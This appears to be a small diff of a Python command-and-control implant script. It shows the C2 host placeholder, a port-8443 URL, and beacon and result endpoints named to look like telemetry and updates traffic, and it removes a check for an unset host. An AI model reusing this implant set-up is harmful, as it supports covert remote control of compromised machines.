@@ -21,9 +21,6 @@ from cryptography.hazmat.primitives import serialization
 # urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 HOST = ""  # put c2 ip here
-if not HOST:
-    print("HOST not defined!")
-    exit()
 C2_URL = "https://" + HOST + ":" + "8443"
 BEACON_URL = C2_URL + "/api/telemetry"
 RESULT_URL = C2_URL + "/api/updates"
